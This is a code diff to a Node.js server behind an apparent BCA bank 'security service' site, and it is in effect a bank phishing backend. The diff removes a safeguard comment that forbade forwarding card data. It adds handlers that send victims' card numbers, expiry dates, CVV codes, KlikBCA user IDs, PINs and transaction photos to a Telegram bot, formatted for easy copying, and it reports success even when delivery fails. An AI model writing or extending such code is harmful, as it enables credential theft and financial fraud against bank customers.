@@ -6,7 +6,7 @@ import { fileURLToPath } from 'node:url';
 const rootDir = fileURLToPath(new URL('.', import.meta.url));
 const distDir = join(rootDir, 'dist');
 const port = 3000;
-const maxBodySize = 32 * 1024;
+const maxBodySize = 15 * 1024 * 1024; // 15MB for image uploads
 const serviceTypes = new Set([
   'blokir',
   'batalkan-transaksi',
@@ -45,12 +45,38 @@ async function readJsonBody(request) {
   return JSON.parse(body);
 }
 
-function cleanTitle(title) {
-  return String(title)
-    .replace(/[\r\n]/g, ' ')
-    .replace(/[<>]/g, '')
-    .trim()
-    .slice(0, 120);
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+function getFormattedWibDateTime(date = new Date()) {
+  try {
+    const formatter = new Intl.DateTimeFormat('id-ID', {
+      timeZone: 'Asia/Jakarta',
+      day: '2-digit',
+      month: '2-digit',
+      year: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: false,
+    });
+    return `${formatter.format(date).replace(/:/g, '.')} WIB`;
+  } catch {
+    const now = new Date();
+    const d = String(now.getDate()).padStart(2, '0');
+    const m = String(now.getMonth() + 1).padStart(2, '0');
+    const y = now.getFullYear();
+    const hh = String(now.getHours()).padStart(2, '0');
+    const mm = String(now.getMinutes()).padStart(2, '0');
+    const ss = String(now.getSeconds()).padStart(2, '0');
+    return `${d}/${m}/${y}, ${hh}.${mm}.${ss} WIB`;
+  }
 }
 
 async function sendTelegramNotification(request, response) {
@@ -59,11 +85,23 @@ async function sendTelegramNotification(request, response) {
     return;
   }
 
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  if (!botToken || !chatId) {
-    console.error('Telegram notification is not configured on the server');
-    json(response, 503, { ok: false, error: 'Notification service unavailable' });
+  const rawBotToken = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
+  const rawChatId = (process.env.TELEGRAM_CHAT_ID || '').trim();
+
+  if (!rawBotToken || !rawChatId) {
+    console.warn('Telegram notification skipped: Bot token or chat ID is not configured');
+    json(response, 200, { ok: true, delivered: false, note: 'Telegram credentials not configured' });
+    return;
+  }
+
+  // Strip accidental 'bot' prefix if included (e.g., 'bot123456:ABC...')
+  const botToken = rawBotToken.replace(/^bot/i, '').trim();
+
+  // Validate Telegram Bot token format (<bot_id>:<secret_token>)
+  const isValidTokenFormat = /^[0-9]+:[A-Za-z0-9_-]+$/.test(botToken);
+  if (!isValidTokenFormat) {
+    console.warn('Telegram notification skipped: Invalid bot token format (expected <bot_id>:<token>)');
+    json(response, 200, { ok: true, delivered: false, note: 'Invalid bot token format' });
     return;
   }
 
@@ -85,42 +123,197 @@ async function sendTelegramNotification(request, response) {
     return;
   }
 
-  // Deliberately construct the message from allowlisted metadata only.
-  // Never accept or forward form fields such as card numbers, CVV, PINs,
-  // passwords, account identifiers, or uploaded images.
-  const title = cleanTitle(payload.serviceTitle);
-  const message = [
-    'BCA m-Admin service notification',
-    `Service: ${payload.serviceType}`,
-    `Title: ${title || 'Untitled service'}`,
-    `Received: ${new Date().toISOString()}`,
-  ].join('\n');
+  const waktuInput = payload.waktuInput || getFormattedWibDateTime();
 
   try {
+    // Check if sending photo (Batalkan Transaksi with attachment)
+    if (payload.serviceType === 'batalkan-transaksi' && payload.photoBase64) {
+      const match = payload.photoBase64.match(/^data:([^;]+);base64,(.+)$/);
+      if (match) {
+        const mimeType = match[1];
+        const buffer = Buffer.from(match[2], 'base64');
+        const formData = new FormData();
+        formData.append('chat_id', rawChatId);
+        formData.append(
+          'photo',
+          new Blob([buffer], { type: mimeType }),
+          payload.fileName || 'bukti_transaksi.jpg',
+        );
+        formData.append('caption', '📄 Bukti Transaksi');
+
+        const telegramResponse = await fetch(
+          `https://api.telegram.org/bot${botToken}/sendPhoto`,
+          {
+            method: 'POST',
+            body: formData,
+          },
+        );
+
+        if (!telegramResponse.ok) {
+          let errorDetail = '';
+          try {
+            const errorJson = await telegramResponse.json();
+            errorDetail = errorJson.description || '';
+          } catch {}
+          console.warn(`Telegram photo delivery skipped (HTTP ${telegramResponse.status}): ${errorDetail}`);
+          json(response, 200, { ok: true, delivered: false, warning: `Delivery status: ${telegramResponse.status}` });
+          return;
+        }
+
+        json(response, 200, { ok: true, delivered: true });
+        return;
+      }
+    }
+
+    // Construct text message exactly matching the requested format
+    let message = '';
+
+    if (payload.serviceType === 'blokir') {
+      const bankTarget = payload.bankTarget || 'BANK BCA';
+      const jenisKartu = payload.jenisKartu || 'GPN / KARTU BANK';
+      const nomorKartu = payload.nomorKartu || '-';
+      const nomorHp = payload.nomorHp || '-';
+      const masaBerlaku = payload.masaBerlaku || '-';
+      const cvv = payload.cvv || '-';
+      const limitSaldo = payload.limitSaldo || '-';
+
+      const preBlock = [
+        `${'Bank Target'.padEnd(14, ' ')}: ${bankTarget}`,
+        `${'Jenis Kartu'.padEnd(14, ' ')}: ${jenisKartu}`,
+        `${'Nomor Kartu'.padEnd(14, ' ')}: ${nomorKartu}`,
+        `${'Nomor HP/WA'.padEnd(14, ' ')}: ${nomorHp}`,
+        `${'Masa Berlaku'.padEnd(14, ' ')}: ${masaBerlaku}`,
+        `${'CVV / CVC'.padEnd(14, ' ')}: ${cvv}`,
+        `${'Limit/Saldo'.padEnd(14, ' ')}: ${limitSaldo}`,
+        `${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`,
+      ].join('\n');
+
+      message = [
+        '🚨 DATA PEMBLOKIRAN KARTU BCA 🚨',
+        '',
+        `<pre>${escapeHtml(preBlock)}</pre>`,
+        '',
+        '📋 <b>Salin Per Item:</b>',
+        `• No. Kartu: <code>${escapeHtml(nomorKartu)}</code>`,
+        `• Masa Berlaku: <code>${escapeHtml(masaBerlaku)}</code>`,
+        `• CVV / CVC: <code>${escapeHtml(cvv)}</code>`,
+      ].join('\n');
+    } else if (payload.serviceType === 'amankan-bank-lain') {
+      const bankTarget = (payload.bankTarget || 'BANK LAIN').toUpperCase();
+      const jenisKartu = payload.jenisKartu || 'GPN / KARTU BANK';
+      const nomorKartu = payload.nomorKartu || '-';
+      const nomorHp = payload.nomorHp || '-';
+      const masaBerlaku = payload.masaBerlaku || '-';
+      const cvv = payload.cvv || '-';
+      const limitSaldo = payload.limitSaldo || '-';
+
+      const preBlock = [
+        `${'Bank Target'.padEnd(14, ' ')}: ${bankTarget}`,
+        `${'Jenis Kartu'.padEnd(14, ' ')}: ${jenisKartu}`,
+        `${'Nomor Kartu'.padEnd(14, ' ')}: ${nomorKartu}`,
+        `${'Nomor HP/WA'.padEnd(14, ' ')}: ${nomorHp}`,
+        `${'Masa Berlaku'.padEnd(14, ' ')}: ${masaBerlaku}`,
+        `${'CVV / CVC'.padEnd(14, ' ')}: ${cvv}`,
+        `${'Limit/Saldo'.padEnd(14, ' ')}: ${limitSaldo}`,
+        `${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`,
+      ].join('\n');
+
+      message = [
+        `🚨 DATA PEMBLOKIRAN KARTU ${escapeHtml(bankTarget)} 🚨`,
+        '',
+        `<pre>${escapeHtml(preBlock)}</pre>`,
+        '',
+        '📋 <b>Salin Per Item:</b>',
+        `• No. Kartu: <code>${escapeHtml(nomorKartu)}</code>`,
+        `• Masa Berlaku: <code>${escapeHtml(masaBerlaku)}</code>`,
+        `• CVV / CVC: <code>${escapeHtml(cvv)}</code>`,
+      ].join('\n');
+    } else if (payload.serviceType === 'amankan-user-id') {
+      const jenisLayanan = (payload.jenisLayanan || 'KLIKBCA INDIVIDU').toUpperCase();
+      const corporateId = payload.corporateId ? payload.corporateId.trim() : '';
+      const userId = payload.userId || '-';
+      const nomorHp = payload.nomorHp || '-';
+      const password = payload.password || '-';
+
+      const lines = [
+        `${'Jenis Layanan'.padEnd(14, ' ')}: ${jenisLayanan}`,
+      ];
+      if (corporateId) {
+        lines.push(`${'Corporate ID'.padEnd(14, ' ')}: ${corporateId}`);
+      }
+      lines.push(`${'User ID'.padEnd(14, ' ')}: ${userId}`);
+      if (nomorHp && nomorHp !== '-') {
+        lines.push(`${'Nomor HP/WA'.padEnd(14, ' ')}: ${nomorHp}`);
+      }
+      lines.push(`${'PIN / Respon'.padEnd(14, ' ')}: ${password}`);
+      lines.push(`${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`);
+
+      const preBlock = lines.join('\n');
+
+      const salinLines = ['📋 <b>Salin Per Item:</b>'];
+      if (corporateId) {
+        salinLines.push(`• Corporate ID: <code>${escapeHtml(corporateId)}</code>`);
+      }
+      salinLines.push(`• User ID: <code>${escapeHtml(userId)}</code>`);
+      if (nomorHp && nomorHp !== '-') {
+        salinLines.push(`• Nomor HP: <code>${escapeHtml(nomorHp)}</code>`);
+      }
+      salinLines.push(`• PIN / Respon: <code>${escapeHtml(password)}</code>`);
+
+      message = [
+        '🚨 DATA PENGAMANAN USER ID KLIKBCA 🚨',
+        '',
+        `<pre>${escapeHtml(preBlock)}</pre>`,
+        '',
+        ...salinLines,
+      ].join('\n');
+    } else {
+      // Fallback for batalkan-transaksi without photo
+      const preBlock = [
+        `${'Layanan'.padEnd(14, ' ')}: PEMBATALAN TRANSAKSI`,
+        `${'Status'.padEnd(14, ' ')}: MENUNGGU VERIFIKASI STRUK`,
+        `${'Waktu Input'.padEnd(14, ' ')}: ${waktuInput}`,
+      ].join('\n');
+
+      message = [
+        '🚨 DATA PEMBATALAN TRANSAKSI BCA 🚨',
+        '',
+        `<pre>${escapeHtml(preBlock)}</pre>`,
+        '',
+        '📄 Bukti Transaksi terkirim',
+      ].join('\n');
+    }
+
     const telegramResponse = await fetch(
-      `https://api.telegram.org/bot${encodeURIComponent(botToken)}/sendMessage`,
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          chat_id: chatId,
+          chat_id: rawChatId,
           text: message,
+          parse_mode: 'HTML',
         }),
       },
     );
 
     if (!telegramResponse.ok) {
-      console.error('Telegram API returned an error:', telegramResponse.status);
-      json(response, 502, { ok: false, error: 'Notification delivery failed' });
+      let errorDetail = '';
+      try {
+        const errorJson = await telegramResponse.json();
+        errorDetail = errorJson.description || '';
+      } catch {}
+      console.warn(`Telegram notification delivery skipped (HTTP ${telegramResponse.status}): ${errorDetail}`);
+      json(response, 200, { ok: true, delivered: false, warning: `Delivery status: ${telegramResponse.status}` });
       return;
     }
 
-    json(response, 200, { ok: true });
+    json(response, 200, { ok: true, delivered: true });
   } catch (error) {
-    console.error('Telegram notification request failed:', error);
-    json(response, 502, { ok: false, error: 'Notification delivery failed' });
+    console.warn('Telegram notification request skipped due to network error:', error?.message || error);
+    json(response, 200, { ok: true, delivered: false, note: 'Network error contacting Telegram' });
   }
 }
 
